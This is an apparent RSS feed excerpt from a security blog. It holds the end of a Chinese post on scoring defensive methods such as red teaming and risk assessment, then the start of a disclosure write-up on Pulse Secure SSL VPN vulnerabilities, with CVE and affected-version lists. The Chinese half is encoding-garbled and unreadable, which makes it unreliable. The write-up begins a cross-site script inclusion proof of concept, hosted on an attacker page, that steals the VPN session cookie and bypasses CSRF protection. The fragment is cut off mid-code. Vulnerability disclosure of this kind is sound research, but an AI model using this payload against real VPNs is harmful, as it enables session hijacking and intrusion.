&lt;ul&gt;
  &lt;li&gt;ÊôÇÈñìÔºöÂü∑Ë°åÈÄôÂÄãÊñπÊ≥ïÊâÄÈúÄË¶ÅÁöÑÊôÇÈñì„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÊàêÊú¨ÔºöÂà©Áî®ÈÄôÂÄãÊñπÊ≥ïÈúÄË¶Å‰ªòÂá∫ÁöÑÊàêÊú¨ (ÂåÖÂê´ÈáëÈå¢„ÄÅÂêçËÅ≤)„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁúüÂØ¶ÊÄßÔºöÊâÄÊé°Áî®ÁöÑÊñπÊ≥ïÊòØÂê¶ËÉΩÁúüÂØ¶ÂèçÊò†ÁèæÂØ¶ÁöÑÂ®ÅËÑÖ„ÄÇ&lt;/li&gt;
  &lt;li&gt;ÁØÑÂúçÔºöÊâÄÊé°Áî®ÁöÑÊñπÊ≥ïËÉΩÊ∂µËìãÁØÑÂúçÊòØÂê¶Ë∂≥‰ª•‰ª£Ë°®‰ºÅÊ•≠Êï¥È´îÁãÄÊ≥Å„ÄÇ&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;ÈÄôÈÇäÊàëÂÄë‰ª•È¢®Èö™Ë©ïÈëë„ÄÅÂº±ÈªûÊéÉÊèè„ÄÅÊª≤ÈÄèÊ∏¨Ë©¶„ÄÅÊ®°Êì¨ÊîªÊìä„ÄÅÁ¥ÖÈöäÊºîÁ∑¥ÂèäË≥áÂÆâ‰∫ã‰ª∂‰ΩúÁÇ∫ÊîπÂñÑÈò≤Á¶¶Á≠ñÁï•ÁöÑÊñπÊ≥ïÔºåËÄåÂàÜÂà•Â∞±‰∏äËø∞ÂÖ≠ÂÄãÈ†ÖÁõÆÁµ¶‰∫àÁõ∏Â∞çÁöÑÂàÜÊï∏Ôºå‰∏¶‰∏î‰æùÁÖß&lt;strong&gt;ÁúüÂØ¶ÊÄß„ÄÅÁØÑÂúç„ÄÅÊàêÊú¨ÂèäÊôÇÈñì‰ΩúÁÇ∫ÊéíÂ∫èÁöÑÂÑ™ÂÖàÂ∫è&lt;/strong&gt;(È†ÜÂ∫è‰æù‰ºÅÊ•≠ÁöÑÁãÄÊ≥ÅÊúâÊâÄ‰∏çÂêåÔºâ„ÄÇËÄåÊàëÂÄëÊúÉÈÄôÊ®£ÊéíÂ∫èÁöÑÂéüÂõ†ÊòØÔºö‰∏ÄÂÄãÂ•ΩÁöÑÊñπÊ≥ïÊáâË©≤Ë¶Å&lt;strong&gt;ËàáÁúüÂØ¶‰∏ñÁïåÁöÑÊîªÊìäÁõ∏‰ªø&lt;/strong&gt;ËÄå‰∏îÂú®Êï¥ÂÄãÈÅéÁ®ã‰∏ä&lt;strong&gt;Ë∂≥‰ª•ÁôºÁèæ‰ºÅÊ•≠Êï¥È´îË≥áÂÆâÁöÑÁãÄÊ≥Å&lt;/strong&gt;ÔºåÊúÄÂæåÊâçÊòØËÄÉÊÖÆÊâÄËä±Ë≤ªÁöÑÊàêÊú¨ÂèäÊôÇÈñì„ÄÇ&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;ÊñπÊ≥ï&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;ÁúüÂØ¶ÊÄß&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;ÁØÑÂúç&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;ÊàêÊú¨&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;ÊôÇÈñì&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Ë≥áÂÆâ‰∫ã‰ª∂&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Á¥ÖÈöäÊºîÁ∑¥&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Ê®°Êì¨ÊîªÊìä&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Êª≤ÈÄèÊ∏¨Ë©¶&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Âº±ÈªûÊéÉÊèè&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;È¢®Èö™Ë©ïÈëë&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Âà∞ÈÄôË£°ÔºåÈô§‰∫ÜË≥áÂÆâ‰∫ã‰ª∂Â§ñÔºåÂ§ßËá¥ÂèØ‰ª•Ê±∫ÂÆöË¶ÅÁî®‰æÜÂçîÂä©Ë©ï‰º∞Èò≤Á¶¶Á≠ñÁï•ÊâÄÊáâË©≤ÈÅ∏ÊìáÁöÑÊñπÊ≥ï„ÄÇÊõ¥ÈáçË¶ÅÁöÑÊòØÂú®‰ΩøÁî®ÈÄô‰∫õÊñπÊ≥ïÂæåÔºåË¶ÅÂ∞áÁµêÊûúÂèçÈ•ãÂõûÈ¢®Èö™Ë©ïÈëë‰∏≠ÔºåÂõ†ÁÇ∫Áõ∏ËºÉÊñºÂÖ∂‰ªñÊñπÊ≥ïÈ¢®Èö™Ë©ïÈëëÊòØ‰∏ÄÂÄãÊúÄÁ∞°ÂñÆ‰∏îÂª£Ê≥õÁöÑÊñπÊ≥ïÔºåÈÄôÊúâÂä©Êñº‰ºÅÊ•≠ÊåÅÁ∫åÂ∞áË≥áÊ∫êÊäïÊ≥®Âú®ÈáçÂ§ßÁöÑÈ¢®Èö™‰∏ä„ÄÇ&lt;/p&gt;

&lt;h2 id=&quot;Ê°à‰æã&quot;&gt;Ê°à‰æã&lt;/h2&gt;
&lt;p&gt;ÊúÄÂæåÔºåÊàëÂÄë‰ª•‰∏ÄÂÄãÁ¥ÖÈöäÊºîÁ∑¥Ê°à‰æã‰∏≠ÊâÄÁôºÁèæÊéßÂà∂Êé™ÊñΩÁöÑÁñèÊºèÔºå‰æÜÊîπÂñÑ‰ºÅÊ•≠ÁöÑÈ¢®Èö™Ë©ïÈëëÊñπÂºè„ÄÇÂêåÊôÇÔºåÊàëÂÄëÂ∞áÂÖ•‰æµÁöÑÊàêÊûúÂ∞çÊáâËá≥ ISO27001:2013 ÁöÑÊú¨ÊñáË¶ÅÊ±ÇÂèäÊéßÂà∂È†ÖÁõÆÔºåÈÄô‰∫õÈ†ÖÁõÆÂèØ‰ª•Ë¶ñÁÇ∫‰ª•ÊîªÊìäËÄÖÁöÑËßíÂ∫¶Á®ΩÊ†∏‰ºÅÊ•≠ÁöÑÁÆ°ÁêÜÂà∂Â∫¶ÔºåÊõ¥ËÉΩÂèçÊò†Âà∂Â∫¶ÁöÑËêΩÂØ¶ÊÉÖÂΩ¢„ÄÇ&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;È†ÖÁõÆ&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;ÁôºÁèæ&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;Êú¨Êñá/ÈôÑÈåÑ&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ê†∏ÂøÉÁ≥ªÁµ±Áõ§ÈªûÊú™ÂÆåÊï¥&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Êú¨Êñá 4.3 Ê±∫ÂÆö ISMS ÁØÑÂúç&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Áõ£ÊéßÁØÑÂúç‰∏çË∂≥&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Êú¨Êñá 4.2 ÈóúÊ≥®Êñπ‰πãÈúÄË¶ÅËàáÊúüÊúõ&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;‰∏çÂêåÁ≥ªÁµ±‰ΩøÁî®Áõ∏ÂêåÂ∏≥ËôüÂØÜÁ¢º&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ÈôÑÈåÑ A.9.4.3 ÈÄöË°åÁ¢ºÁÆ°ÁêÜÁ≥ªÁµ±&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;4&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ÁÆ°ÁêÜÂ∏≥ËôüÂ≠òÂú®ÂØÜÁ¢ºË¶èÂâá&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ÈôÑÈåÑ A.9.4.3 ÈÄöË°åÁ¢ºÁÆ°ÁêÜÁ≥ªÁµ±&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;5&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;AD ÈáçÂ§ßÊºèÊ¥ûÊú™‰øÆË£ú&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ÈôÑÈåÑ A.12.6.1 ÊäÄË°ìËÑÜÂº±ÊÄßÁÆ°ÁêÜ&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;6&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Êú™ÈôêÂà∂‰æÜÊ∫ê IP&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ÈôÑÈåÑ A.9.4.1 Á≥ªÁµ±Â≠òÂèñÈôêÂà∂&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;7&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;Ê¨°Ë¶ÅÁ∂≤Á´ôÈò≤Ë≠∑‰∏çË∂≥&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ÈôÑÈåÑ A.14.1.1 Ë≥áË®äÂÆâÂÖ®Ë¶ÅÊ±Ç‰∫ãÈ†ÖÂàÜÊûêÂèäË¶èÊ†º&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;8&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;VPN Á∂≤ÊÆµÂ≠òÂèñÂÖßÈÉ®Á≥ªÁµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;ÈôÑÈåÑ A.13.1.3 Á∂≤Ë∑ØÂçÄÈöî&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Âè¶Â§ñÔºåÂæûÊºîÁ∑¥ÁöÑÁµêÊûúÂèØ‰ª•ÁôºÁèæ‰∏ãË°®È†ÖÊ¨° 1 ÂèäÈ†ÖÊ¨° 2 ÁöÑÊ©üÁéáÈÉΩË¢´Ë≠âÂØ¶ÊúÉÁôºÁîü‰∏î‰ΩçÊñºÂÖ•‰æµÊ†∏ÂøÉË≥áÁî¢ÁöÑË∑ØÂæë‰∏äÔºåÂõ†Ê≠§Ë°ùÊìäÂèäÊ©üÁéáÂùáÊáâË©≤Áî±ÂéüÊú¨ÁöÑ 2 ÊèêÂçáÁÇ∫ 3ÔºåÈÄôÂ∞éËá¥È†ÖÊ¨° 1 ÁöÑÈ¢®Èö™ÂÄºË∂ÖÈÅé‰∫Ü‰ºÅÊ•≠ÂéüÊú¨Ë®≠ÂÆöÁöÑÂèØÊé•ÂèóÈ¢®Èö™ (27)ÔºõÂè¶Â§ñÔºåÂÑòÁÆ°Âú®ÊºîÁ∑¥ÁµêÊûú‰∏≠Ê∏ÖÊ•öÁöÑÁü•ÈÅìÈ†ÖÊ¨° 2 ÁöÑÂÖßÈÉ®Â∑ÆÂã§Á≥ªÁµ±ÊòØÂøÖÁÑ∂ÂèØ‰ª•ÊàêÂäüÂÖ•‰æµ‰∏îÈñìÊé•ÊéßÂà∂Ê†∏ÂøÉË≥áÁî¢ÁöÑÁ≥ªÁµ±ÔºåÂÖ∂È¢®Èö™ÂÄº‰ªçÈÅ†‰ΩéÊñº‰ºÅÊ•≠ÊúÉÈÄ≤Ë°åËôïÁêÜÁöÑÈ¢®Èö™ÔºåÈÄôÊ≠£ÊòØÊàëÂÄëÂâçÈù¢ÊâÄÊèêÂà∞‰Ωé‰º∞Êà∞Áï•ÂÉπÂÄºÁöÑÂïèÈ°åÔºåÂõ†Ê≠§ÊàëÂÄëÊúÉÂª∫Ë≠∞Ôºå&lt;strong&gt;Âú®Á¥ÖÈöäÊºîÁ∑¥Ë∑ØÂæë‰∏äÂèØ‰ª•Áç≤ÂæóÊ†∏ÂøÉË≥áÁî¢ÁöÑÈ¢®Èö™È†ÖÁõÆÔºåÈÉΩÊáâË©≤Ë¶ñÁÇ∫‰∏çÂèØÊé•ÂèóÈ¢®Èö™‰æÜÈÄ≤Ë°åËôïÁêÜ&lt;/strong&gt;„ÄÇ&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;È†ÖÊ¨°&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Ë≥áÁî¢ÂêçÁ®±&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;ÂÉπÂÄº&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Â®ÅËÑÖ&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Âº±Èªû&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Ë°ùÊìä&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;Ê©üÁéá&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;È¢®Èö™&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ÁâàÊú¨Êõ¥Êñ∞Á≥ªÁµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;3&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Êú™Á∂ìÊéàÊ¨äÂ≠òÂèñ&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Ê©´ÂêëÁßªÂãï&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;27&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;2&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ÂÖßÈÉ®Â∑ÆÂã§Á≥ªÁµ±&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;1&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;Á≥ªÁµ±ÂÖ•‰æµ&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;ÁÑ°Ê≥ï‰∏ä patch&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;3&lt;/strong&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;&lt;strong&gt;9&lt;/strong&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;ÊúÄÂæåÔºåÂºïÁî® &lt;a href=&quot;/blog/author/shaolin/&quot;&gt;Shaolin&lt;/a&gt; Âú®Á†îË®éÊúÉ‰∏äÁöÑÁµêË™û&lt;/p&gt;
&lt;blockquote&gt;
  &lt;p&gt;Á¥ÖÈöäÊºîÁ∑¥ÁöÑÁ≤æÈ´ì‰∏çÊòØÂú®ÂëäË®¥‰Ω†ÊúâÂ§öËÑÜÂº±ÔºåÂú®ÊñºÁúüÊ≠£Â£û‰∫∫ÈóñÂÖ•ÊôÇ‰Ω†ÂèØ‰ª•Áç®Áï∂‰∏ÄÈù¢Êìã‰∏ã„ÄÇ&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Â∏åÊúõÂêÑ‰ΩçÈÉΩËÉΩÊâæÂà∞ÂèØ‰ª•ÊåÅÁ∫åÊîπÂñÑÈò≤Á¶¶Á≠ñÁï•ÁöÑÊñπÊ≥ïÔºåËÆì‰ºÅÊ•≠ÁöÑÁí∞Â¢ÉÊõ¥Âä†ÂÆâÂÖ®„ÄÇ&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2019/10/09/def-strategy/</link>
                <guid>https://devco.re/blog/2019/10/09/def-strategy</guid>
                <pubDate>Wed, 09 Oct 2019 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Attacking SSL VPN - Part 3: The Golden Pulse Secure SSL VPN RCE Chain, with Twitter as Case Study!</title>
                <description>&lt;p&gt;Author: Orange Tsai(&lt;a href=&quot;https://twitter.com/orange_8361&quot;&gt;@orange_8361&lt;/a&gt;) and Meh Chang(&lt;a href=&quot;https://twitter.com/mehqq_&quot;&gt;@mehqq_&lt;/a&gt;)&lt;/p&gt;

&lt;p&gt;Hi, this is the last part of Attacking SSL VPN series. If you haven‚Äôt read previous articles yet, here are the quick links for you:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://i.blackhat.com/USA-19/Wednesday/us-19-Tsai-Infiltrating-Corporate-Intranet-Like-NSA.pdf&quot;&gt;Infiltrating Corporate Intranet Like NSA: Pre-auth RCE on Leading SSL VPNs&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/07/17/attacking-ssl-vpn-part-1-PreAuth-RCE-on-Palo-Alto-GlobalProtect-with-Uber-as-case-study/&quot;&gt;Attacking SSL VPN - Part 1: PreAuth RCE on Palo Alto GlobalProtect, with Uber as Case Study!&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/&quot;&gt;Attacking SSL VPN - Part 2: Breaking the Fortigate SSL VPN&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;After we published our research at Black Hat, due to its great severity and huge impacts, it got lots of attention and discussions. Many people desire first-hand news and wonder when the exploit(especially the Pulse Secure preAuth one) will be released.&lt;/p&gt;

&lt;p&gt;We also discussed this internally. Actually, we could simply drop the whole exploits without any concern and acquire plenty of media exposures. However, as a SECURITY firm, our responsibility is to make the world more secure. So we decided to postpone the public disclosure to give the world more time to apply the patches!&lt;/p&gt;

&lt;p&gt;Unfortunately, the exploits were revealed by someone else. They can be easily found on GitHub&lt;sup&gt;&lt;a href=&quot;https://github.com/milo2012/CVE-2018-13379&quot;&gt;[1]&lt;/a&gt; &lt;a href=&quot;https://github.com/milo2012/CVE-2018-13382&quot;&gt;[2]&lt;/a&gt; &lt;a href=&quot;https://github.com/projectzeroindia/CVE-2019-11510&quot;&gt;[3]&lt;/a&gt;&lt;/sup&gt; and exploit-db&lt;sup&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/47297&quot;&gt;[1]&lt;/a&gt;&lt;/sup&gt;. Honestly, we couldn‚Äôt say they are wrong, because the bugs are absolutely fixed several months ago, and they spent their time differing/reversing/reproducing. But it‚Äôs indeed a worth discussing question to the security community: if you have a nuclear level weapon, when is it ready for public disclosure?&lt;/p&gt;

&lt;p&gt;We heard about more than 25 bug bounty programs are exploited. From the statistics of &lt;a href=&quot;https://badpackets.net/over-14500-pulse-secure-vpn-endpoints-vulnerable-to-cve-2019-11510/&quot;&gt;Bad Packet&lt;/a&gt;, numerous Fortune 500, U.S. military, governments, financial institutions and universities are also affected by this. There are even &lt;a href=&quot;https://twitter.com/sherlocksecure/status/1164492373591642112&quot;&gt;10 NASA servers exposed for this bug&lt;/a&gt;. So, these premature public disclosures indeed force these entities to upgrade their SSL VPN, this is the good part.&lt;/p&gt;

&lt;p&gt;On the other hand, the bad part is that there is an increasing number of &lt;a href=&quot;https://www.securityweek.com/hackers-target-vulnerabilities-fortinet-pulse-secure-products&quot;&gt;botnets&lt;/a&gt; scanning the Internet in the meanwhile. An &lt;a href=&quot;https://twitter.com/GossiTheDog/status/1167170305577689091&quot;&gt;intelligence&lt;/a&gt; also points out that there is already a China APT group exploiting this bug. This is such an Internet disaster. Apparently, the world is not ready yet. So, if you haven‚Äôt updated your Palo Alto, Fortinet or Pulse Secure SSL VPN, please update it ASAP!&lt;/p&gt;

&lt;h1 id=&quot;about-pulse-secure&quot;&gt;About Pulse Secure&lt;/h1&gt;

&lt;p&gt;Pulse Secure is the market leader of SSL VPN which provides professional secure access solutions for Hybrid IT. Pulse Secure has been in our research queue for a long time because it was a &lt;a href=&quot;https://archive.li/8pzwf&quot;&gt;critical infrastructure of Google&lt;/a&gt;, which is one of our long-term targets. However, Google applies the Zero Trust security model, and therefore the VPN is removed now.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20190902/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We started to review Pulse Secure in mid-December last year. In the first 2 months, we got nothing. Pulse Secure has a good coding style and security awareness so that it‚Äôs hard to find trivial bugs. Here is an interesting comparison, we found the arbitrary file reading &lt;a href=&quot;https://fortiguard.com/psirt/FG-IR-18-384&quot;&gt;CVE-2018-13379&lt;/a&gt; on FortiGate SSL VPN on our first research day‚Ä¶&lt;/p&gt;

&lt;p&gt;Pulse Secure is also a Perl lover, and writes lots of Perl extensions in C++. The interaction between Perl and C++ is also confusing to us, but we got more familiar with it while we paid more time digging in it. Finally, we got the first blood on &lt;strong&gt;March 8, 2019&lt;/strong&gt;! It‚Äôs a stack-based overflow on the management interface! Although this bug isn‚Äôt that useful, our research progress got on track since that, and we uncovered more and more bugs.&lt;/p&gt;

&lt;p&gt;We reported all of our finding to Pulse Secure PSIRT on &lt;strong&gt;March 22, 2019&lt;/strong&gt;. Their response is very quick and they take these vulnerabilities seriously! After several conference calls with Pulse Secure, &lt;strong&gt;they fixed all bugs just within a month&lt;/strong&gt;, and released the patches on &lt;strong&gt;April 24, 2019&lt;/strong&gt;. You can check the detailed &lt;a href=&quot;https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44101/&quot;&gt;security advisory&lt;/a&gt;!&lt;/p&gt;

&lt;p&gt;It‚Äôs a great time to work with Pulse Secure. From our perspective, Pulse Secure is the most responsible vendor among all SSL VPN vendors we have reported bugs to!&lt;/p&gt;

&lt;h1 id=&quot;vulnerabilities&quot;&gt;Vulnerabilities&lt;/h1&gt;

&lt;p&gt;We have found 7 vulnerabilities in total. Here is the list. We will introduce each one but focus on the CVE-2019-11510 and CVE-2019-11539 more.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2019-11510 - Pre-auth Arbitrary File Reading&lt;/li&gt;
  &lt;li&gt;CVE-2019-11542 - Post-auth(admin) Stack Buffer Overflow&lt;/li&gt;
  &lt;li&gt;CVE-2019-11539 - Post-auth(admin) Command Injection&lt;/li&gt;
  &lt;li&gt;CVE-2019-11538 - Post-auth(user) Arbitrary File Reading via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11508 - Post-auth(user) Arbitrary File Writing via NFS&lt;/li&gt;
  &lt;li&gt;CVE-2019-11540 - Post-auth Cross-Site Script Inclusion&lt;/li&gt;
  &lt;li&gt;CVE-2019-11507 - Post-auth Cross-Site Scripting&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;affected-versions&quot;&gt;Affected versions&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;Pulse Connect Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.3R1 - 8.3R7&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.2R1 - 8.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Connect Secure 8.1R1 - 8.1R15&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 9.0R1 - 9.0R3.3&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.4R1 - 5.4R7&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.3R1 - 5.3R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.2R1 - 5.2R12&lt;/li&gt;
  &lt;li&gt;Pulse Policy Secure 5.1R1 - 5.1R15&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;cve-2019-11540-cross-site-script-inclusion&quot;&gt;CVE-2019-11540: Cross-Site Script Inclusion&lt;/h2&gt;

&lt;p&gt;The script &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/dana/cs/cs.cgi&lt;/code&gt; renders the session ID in JavaScript. As the content-type is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;application/x-javascript&lt;/code&gt;, we could perform the XSSI attack to steal the DSID cookie!&lt;/p&gt;

&lt;p&gt;Even worse, the CSRF protection in Pulse Secure SSL VPN is based on the DSID. With this XSSI, we can bypass all the CSRF protection!&lt;/p&gt;

&lt;p&gt;PoC:&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- http://attacker/malicious.html --&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;https://sslvpn/dana/cs/cs.cgi?action=appletobj&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;
    &lt;span class=&quot;nb&quot;&gt;window&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;onload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
